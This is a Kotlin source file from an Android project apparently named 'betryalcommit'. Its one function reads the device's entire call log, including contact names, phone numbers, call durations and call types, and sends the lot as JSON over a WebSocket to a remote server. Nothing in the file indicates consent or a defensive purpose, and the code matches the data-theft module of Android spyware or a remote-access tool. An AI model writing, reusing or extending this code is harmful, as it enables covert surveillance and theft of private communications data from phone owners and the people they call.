package com.example.betryalcommit
import android.content.ContentResolver
import android.database.Cursor
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import okhttp3.WebSocket
import org.json.JSONObject
import java.io.BufferedWriter
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.io.OutputStreamWriter

    object callutil {
        private val uiHandler = Handler(Looper.getMainLooper())
        fun uploadCalls(contentResolver: ContentResolver,webSocket: WebSocket) {
            val numberCol = CallLog.Calls.NUMBER
            val durationCol = CallLog.Calls.DURATION
            val contactCol = CallLog.Calls.CACHED_NAME
            val typeCol = CallLog.Calls.TYPE
            val projection = arrayOf(contactCol, numberCol, durationCol, typeCol)
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection, null, null, null)
            val numberColIdx = cursor?.getColumnIndex(numberCol)
            val durationColIdx = cursor?.getColumnIndex(durationCol)
            val typeColIdx = cursor?.getColumnIndex(typeCol)
            val contactColumnIndex = cursor!!.getColumnIndex(contactCol)
            var text = "Call log : \n\n"
            while (cursor?.moveToNext() == true) {
                val number = cursor.getString(numberColIdx!!)
                val duration = cursor.getString(durationColIdx!!)
                val type = cursor.getString(typeColIdx!!)
                val contactName = cursor?.getString(contactColumnIndex)
                val typeCorrect = if (type == "1") "Incoming" else if (type == "2") "Outgoing" else "Missed"
                text += "Contact:$contactName\nnumber : $number\nduration : $duration\nType : $typeCorrect\n\n" }
            cursor?.close()
           val jsontext = JSONObject()
            jsontext.put("call_logs",text)
            webSocket.send(jsontext.toString())
        }
    }
